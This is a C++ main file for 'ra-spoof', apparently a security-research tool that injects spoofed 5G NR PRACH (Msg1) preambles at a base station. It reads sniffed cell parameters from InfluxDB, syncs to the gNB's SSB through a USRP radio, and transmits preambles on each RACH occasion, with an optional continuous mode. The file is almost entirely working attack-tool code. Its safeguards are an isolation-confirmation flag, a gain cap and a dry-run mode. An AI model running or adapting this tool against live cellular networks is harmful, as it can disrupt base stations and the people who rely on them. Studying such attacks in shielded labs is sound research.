// ra-spoof main — Msg1 PRACH preamble injection
//
// Config: InfluxDB (live sniffer) → ra-spoof.yaml → CLI overrides

#include "cell_config.h"
#include "influx_reader.h"
#include "prach_tx.h"
#include "ra_rnti.h"
#include "ro.h"
#include "log_csv.h"
#include "tool_config.h"

#include <cstdio>
#include <cstring>
#include <csignal>
#include <getopt.h>
#include <cstdlib>
#include <string>
#include <chrono>
#include <thread>

static volatile bool g_running = true;

static void sig_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf("\n[main] Shutting down (signal %d)...\n", sig);
        g_running = false;
    }
}

static void print_usage(const char* prog) {
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -c, --config PATH          ra-spoof.yaml path (default: configs/ra-spoof.yaml)\n");
    printf("  --influx-host HOST         InfluxDB host (default: localhost)\n");
    printf("  --influx-port PORT         InfluxDB port (default: 8086)\n");
    printf("  --influx-org ORG           InfluxDB org (default: rtu)\n");
    printf("  --influx-bucket BUCKET     InfluxDB bucket (default: rtusystem)\n");
    printf("  --influx-data-id ID        Sniffer data_id tag (default: test)\n");
    printf("  --dry-run                  Run pipeline without RF TX\n");
    printf("  --confirm-rf-isolated      Required for RF TX\n");
    printf("  --tx-gain DB               TX gain in dB\n");
    printf("  --device-args ARGS         UHD device args\n");
    printf("  --preamble-index N         RAPID (default: 0)\n");
    printf("  --continuous               Transmit on every RO\n");
    printf("  --cfo-correct / --no-cfo-correct\n");
    printf("  --cfo-sign {+1|-1}         CFO correction sign\n");
    printf("  --cfo-hz F                 Manual DL CFO (Hz)\n");
    printf("  --tx-offset-us F           Manual timing nudge (us)\n");
    printf("  --ssb-first-symbol N       Override SSB intra-slot first symbol\n");
    printf("  --freq-start N             Override msg1-FrequencyStart (PRB)\n");
    printf("  --resync-every N           Re-sync SSB every N TX\n");
    printf("  --max-tx N                 Stop after N TX (0 = unlimited)\n");
    printf("  -h, --help                 Print this help\n");
    printf("\nEnvironment:\n");
    printf("  INFLUX_TOKEN               InfluxDB auth token\n");
}

static void print_banner() {
    printf("\n");
    printf("  ================================================================\n");
    printf("   5G NR Msg1 PRACH Preamble Injector — ra-spoof\n");
    printf("   WARNING: For authorized Faraday-cage security research only.\n");
    printf("  ================================================================\n\n");
}

int main(int argc, char* argv[]) {
    print_banner();

    // --- Defaults / CLI variables ---
    std::string config_path     = "configs/ra-spoof.yaml";
    bool        dry_run         = false;
    bool        rf_isolated     = false;

    influx_cfg icfg;
    icfg.host    = "localhost";
    icfg.port    = 8086;
    icfg.org     = "rtu";
    icfg.bucket  = "rtusystem";
    icfg.data_id = "test";

    // CLI-override flags (null/negative sentinel means "not set from CLI")
    struct cli_overrides {
        bool     has_gain       = false;   double   tx_gain = 0;
        bool     has_devargs    = false;   std::string device_args;
        bool     has_preamble   = false;   uint32_t preamble_index = 0;
        bool     has_continuous = false;   bool continuous = false;
        bool     has_cfo_correct= false;   bool cfo_correct = false;
        bool     has_cfo_sign   = false;   int  cfo_sign = 0;
        bool     has_cfo_hz     = false;   double cfo_hz = 0;
        bool     has_tx_offset  = false;   double tx_offset_us = 0;
        bool     has_ssb_sym    = false;   int32_t ssb_first_symbol = 0;
        bool     has_freq_start = false;   int32_t msg1_freq_start = 0;
        bool     has_resync     = false;   uint32_t resync_every = 0;
        bool     has_max_tx     = false;   uint32_t max_tx = 0;
    } cli;

    static struct option long_opts[] = {
        {"config",              required_argument, 0, 'c'},
        {"influx-host",         required_argument, 0, 'H'},
        {"influx-port",         required_argument, 0, 'P'},
        {"influx-org",          required_argument, 0, 'O'},
        {"influx-bucket",       required_argument, 0, 'B'},
        {"influx-data-id",      required_argument, 0, 'I'},
        {"dry-run",             no_argument,       0, 'D'},
        {"confirm-rf-isolated", no_argument,       0, 'R'},
        {"tx-gain",             required_argument, 0, 'G'},
        {"device-args",         required_argument, 0, 'A'},
        {"preamble-index",      required_argument, 0, 'E'},
        {"continuous",          no_argument,       0, 'T'},
        {"cfo-correct",         no_argument,       0, 'C'},
        {"no-cfo-correct",      no_argument,       0, 'F'},
        {"cfo-sign",            required_argument, 0, 'S'},
        {"cfo-hz",              required_argument, 0, 'Z'},
        {"tx-offset-us",        required_argument, 0, 'U'},
        {"ssb-first-symbol",    required_argument, 0, 'L'},
        {"freq-start",          required_argument, 0, 'Q'},
        {"resync-every",        required_argument, 0, 'Y'},
        {"max-tx",              required_argument, 0, 'M'},
        {"help",                no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int c;
    while ((c = getopt_long(argc, argv, "c:h", long_opts, nullptr)) != -1) {
        switch (c) {
            case 'c': config_path        = optarg; break;
            case 'H': icfg.host          = optarg; break;
            case 'P': icfg.port          = atoi(optarg); break;
            case 'O': icfg.org           = optarg; break;
            case 'B': icfg.bucket        = optarg; break;
            case 'I': icfg.data_id       = optarg; break;
            case 'D': dry_run            = true; break;
            case 'R': rf_isolated        = true; break;
            case 'G': cli.tx_gain        = atof(optarg); cli.has_gain = true; break;
            case 'A': cli.device_args    = optarg; cli.has_devargs = true; break;
            case 'E': cli.preamble_index = (uint32_t)atoi(optarg); cli.has_preamble = true; break;
            case 'T': cli.continuous     = true; cli.has_continuous = true; break;
            case 'C': cli.cfo_correct    = true; cli.has_cfo_correct = true; break;
            case 'F': cli.cfo_correct    = false; cli.has_cfo_correct = true; break;
            case 'S': cli.cfo_sign       = atoi(optarg); cli.has_cfo_sign = true; break;
            case 'Z': cli.cfo_hz         = atof(optarg); cli.has_cfo_hz = true; break;
            case 'U': cli.tx_offset_us   = atof(optarg); cli.has_tx_offset = true; break;
            case 'L': cli.ssb_first_symbol = (int32_t)atoi(optarg); cli.has_ssb_sym = true; break;
            case 'Q': cli.msg1_freq_start = (int32_t)atoi(optarg); cli.has_freq_start = true; break;
            case 'Y': cli.resync_every   = (uint32_t)atoi(optarg); cli.has_resync = true; break;
            case 'M': cli.max_tx         = (uint32_t)atoi(optarg); cli.has_max_tx = true; break;
            case 'h': print_usage(argv[0]); return 0;
            default:  print_usage(argv[0]); return 1;
        }
    }

    // --- Load tool_config from YAML ---
    tool_config tc;
    parse_tool_config(config_path, tc);

    // --- Apply CLI overrides on top (CLI always wins) ---
    if (cli.has_gain)        { tc.tx.gain_db        = cli.tx_gain;        tc.tx.src_gain      = tool_config::SRC_CLI; }
    if (cli.has_devargs)     { tc.tx.device_args     = cli.device_args;    tc.tx.src_devargs   = tool_config::SRC_CLI; }
    if (cli.has_preamble)    { tc.tx.preamble_index  = cli.preamble_index; tc.tx.src_preamble  = tool_config::SRC_CLI; }
    if (cli.has_continuous)  { tc.run.continuous     = cli.continuous;     tc.run.src_cont     = tool_config::SRC_CLI; }
    if (cli.has_cfo_correct) { tc.cfo.correct        = cli.cfo_correct;    tc.cfo.src_correct  = tool_config::SRC_CLI; }
    if (cli.has_cfo_sign)    { tc.cfo.sign           = cli.cfo_sign;       tc.cfo.src_sign     = tool_config::SRC_CLI; }
    if (cli.has_cfo_hz)      { tc.cfo.manual_hz      = cli.cfo_hz;         tc.cfo.src_manual_hz = tool_config::SRC_CLI; }
    if (cli.has_tx_offset)   { tc.timing.tx_offset_us = cli.tx_offset_us;  tc.timing.src_tx_offset = tool_config::SRC_CLI; }
    if (cli.has_ssb_sym)     { tc.timing.ssb_first_symbol_override = cli.ssb_first_symbol; tc.timing.src_ssb_sym = tool_config::SRC_CLI; }
    if (cli.has_freq_start)  { tc.freq.msg1_freq_start_override = cli.msg1_freq_start; tc.freq.src_freq_start = tool_config::SRC_CLI; }
    if (cli.has_resync)      { tc.run.resync_every  = cli.resync_every;    tc.run.src_resync   = tool_config::SRC_CLI; }
    if (cli.has_max_tx)      { tc.run.max_tx        = cli.max_tx;          tc.run.src_max_tx   = tool_config::SRC_CLI; }

    // Safety checks
    if (tc.tx.gain_db > 70.0) {
        fprintf(stderr, "FATAL: TX gain %.1f dB exceeds safety cap (70 dB). Refusing.\n", tc.tx.gain_db);
        return 1;
    }
    if (!rf_isolated && !dry_run) {
        fprintf(stderr, "FATAL: RF TX requires --confirm-rf-isolated flag.\n"
                        "       Use --dry-run for offline testing.\n");
        return 1;
    }
    if (tc.cfo.sign != +1 && tc.cfo.sign != -1) {
        fprintf(stderr, "FATAL: cfo.sign must be +1 or -1 (got %d)\n", tc.cfo.sign);
        return 1;
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // --- Dry-run: print resolved config and exit ---
    if (dry_run) {
        printf("[main] DRY RUN -- resolved configuration:\n");
        print_tool_config(tc);
    }

    // -----------------------------------------------------------------------
    // Step 1: Load cell config from InfluxDB (sole config source)
    // -----------------------------------------------------------------------
    cell_config cfg;

    printf("[main] Step 1: Pulling cell config from InfluxDB...\n");
    if (!influx_pull_cell_config(icfg, cfg)) {
        fprintf(stderr, "[main] FATAL: InfluxDB pull failed.\n");
        return 1;
    }
    influx_sanity_check(cfg);

    // Populate prach_x/y/subframe/format from prach_config_idx
    cfg.resolve_prach_ro();
    print_cell_config(cfg);

    // -----------------------------------------------------------------------
    // Step 2: Compute RA-RNTI
    // -----------------------------------------------------------------------
    uint32_t s_id       = 0;
    uint32_t t_id       = cfg.prach_subframe;
    uint32_t f_id       = 0;
    uint32_t ul_carrier = 0;

    uint16_t ra_rnti = compute_ra_rnti(s_id, t_id, f_id, ul_carrier);
    printf("\n[main] Step 2: RA-RNTI = 1 + %u + 14*%u = 0x%04x (%u)\n",
           s_id, t_id, ra_rnti, ra_rnti);

    // -----------------------------------------------------------------------
    // Step 3: Find next PRACH occasion
    // -----------------------------------------------------------------------
    printf("\n[main] Step 3: RACH occasion timing:\n");
    printf("  config_idx=%u → subframe %u, SFN %% %u == %u\n",
           cfg.prach_config_idx, cfg.prach_subframe, cfg.prach_x, cfg.prach_y);

    ro::print_occasions_in_range(cfg, 0, 200);

    uint32_t ro_sys_slot = ro::next_occasion_slot(cfg, 0);
    uint32_t ro_sfn, ro_slot_in_frame;
    ro::from_system_slot(ro_sys_slot, ro_sfn, ro_slot_in_frame);
    printf("\n[main] Target RO: SFN=%u, slot=%u (system_slot=%u)\n",
           ro_sfn, ro_slot_in_frame, ro_sys_slot);

    // -----------------------------------------------------------------------
    // Step 4: Initialize PRACH TX
    // -----------------------------------------------------------------------
    printf("\n[main] Step 4: Initializing PRACH TX...\n");
    printf("[main] CFO correction: %s (sign=%+d manual_hz=%.0f)\n",
           tc.cfo.correct ? "enabled" : "disabled", tc.cfo.sign, tc.cfo.manual_hz);
    prach_tx ptx;
    if (!ptx.init(cfg, tc, dry_run)) {
        fprintf(stderr, "[main] FATAL: prach_tx::init failed\n");
        return 1;
    }

    // -----------------------------------------------------------------------
    // Step 5: Open USRP
    // -----------------------------------------------------------------------
    printf("\n[main] Step 5: Opening USRP...\n");
    if (!ptx.open_rf(tc.tx.device_args)) {
        fprintf(stderr, "[main] FATAL: Failed to open USRP\n");
        return 1;
    }

    // -----------------------------------------------------------------------
    // Step 6: Initialize logging
    // -----------------------------------------------------------------------
    log_csv::init("ra-spoof_msg1.csv");

    // -----------------------------------------------------------------------
    // Step 6.5: SSB sync
    // -----------------------------------------------------------------------
    printf("\n[main] Step 6.5: Synchronizing to gNB SSB (PCI=%u)...\n", cfg.pci);

    {
        uint32_t fb_sfn=0, fb_ssb_idx=0, fb_ssb_slot=0, fb_scs=0;
        bool fb_hrf=false;
        double fb_unix_time=0.0;
        if (influx_pull_mib_timing(icfg, &fb_sfn, &fb_ssb_idx, &fb_hrf,
                                   &fb_ssb_slot, &fb_scs, &fb_unix_time)) {
            ptx.set_sync_fallback(fb_unix_time, fb_sfn, fb_ssb_slot, fb_ssb_idx);
        } else {
            printf("[main] WARNING: Could not pull MIB timing from sniffer\n");
        }
    }

    if (!ptx.sync_to_ssb()) {
        fprintf(stderr, "[main] FATAL: SSB sync failed.\n");
        log_csv::close();
        return 1;
    }
    printf("[main] SSB sync OK. Recomputing RO from live timing...\n");

    uint32_t sync_sys_slot = ro::system_slot(ptx.get_sync_sfn(), ptx.get_sync_slot());
    ro_sys_slot = ro::next_occasion_slot(cfg, sync_sys_slot);
    ro::from_system_slot(ro_sys_slot, ro_sfn, ro_slot_in_frame);
    printf("[main] Updated Target RO: SFN=%u, slot=%u (system_slot=%u)\n",
           ro_sfn, ro_slot_in_frame, ro_sys_slot);

    // -----------------------------------------------------------------------
    // Step 7: Transmit preamble(s)
    // -----------------------------------------------------------------------
    printf("\n[main] Step 7: Transmitting PRACH preamble (Msg1)...\n");

    if (tc.run.continuous) {
        printf("[main] Continuous mode: transmitting on every RO (Ctrl-C to stop).\n");
    }

    uint32_t  tx_ro_sys_slot = ro_sys_slot;
    uint32_t  tx_ro_sfn      = ro_sfn;
    uint32_t  tx_ro_slot     = ro_slot_in_frame;
    uint32_t  tx_count       = 0;
    uint32_t  tx_ok_count    = 0;
    double    last_tx_time    = 0.0;
    const double ro_interval_s = 0.160;

    do {
        if (tc.run.continuous && tx_count > 0) {
            printf("\n--- Transmission %u (loop) ---\n", tx_count + 1);
        }

        // Optional re-sync every N TX
        if (tc.run.resync_every > 0 && tx_count > 0 && tx_count % tc.run.resync_every == 0) {
            printf("[main] Re-syncing to SSB (every %u TX)...\n", tc.run.resync_every);
            if (!ptx.sync_to_ssb()) {
                fprintf(stderr, "[main] WARNING: re-sync failed, continuing with old timing\n");
            }
        }

        bool tx_ok;
        if (tc.run.continuous && tx_count > 0 && last_tx_time > 0.0) {
            last_tx_time += ro_interval_s;
            tx_ok = ptx.transmit_at_time(last_tx_time, tx_ro_sfn, tx_ro_slot);
        } else {
            tx_ok = ptx.transmit_preamble(tx_ro_sfn, tx_ro_slot);
            last_tx_time = ptx.get_last_tx_time();
        }

        if (tx_ok) {
            tx_ok_count++;
            log_csv::log_event("Msg1_PRACH",
                               tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot,
                               ra_rnti, tc.tx.preamble_index, tc.tx.gain_db,
                               0, "transmitted");
        } else {
            fprintf(stderr, "[main] PRACH transmission %u failed\n", tx_count + 1);
            log_csv::log_event("Msg1_PRACH",
                               tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot,
                               ra_rnti, tc.tx.preamble_index, tc.tx.gain_db, 0, "failed");
        }

        if (!tc.run.continuous) break;

        tx_count++;
        if (tc.run.max_tx > 0 && tx_count >= tc.run.max_tx) {
            printf("[main] max_tx=%u reached, stopping\n", tc.run.max_tx);
            break;
        }

        tx_ro_sys_slot = ro::next_occasion_slot(cfg, tx_ro_sys_slot);
        ro::from_system_slot(tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot);
        printf("[main] Next RO: SFN=%u slot=%u (system_slot=%u)\n",
               tx_ro_sfn, tx_ro_slot, tx_ro_sys_slot);

        std::this_thread::sleep_for(std::chrono::milliseconds(30));

    } while (g_running);

    if (tc.run.continuous) {
        printf("\n[main] ========== SUMMARY ==========\n");
        printf("[main] Total transmissions: %u\n", tx_count);
        printf("[main] Successful:          %u\n", tx_ok_count);
        printf("[main] Failures:            %u\n", tx_count - tx_ok_count);
    }

    printf("[main] Expected gNB behavior:\n");
    printf("  1. gNB log: 'PRACH detected preamble=...' \n");
    printf("  2. gNB emits RAR on RA-RNTI=0x%04x (%u)\n", ra_rnti, ra_rnti);
    printf("[main] Check: tail -f /tmp/gnb.log | grep -E 'PRACH|preamble|RAR|ra.rnti'\n");

    log_csv::close();
    printf("\n[main] Done.\n\n");

    int ret = (tx_ok_count > 0) ? 0 : 1;

    fflush(stdout);
    fflush(stderr);
    _exit(ret);
}
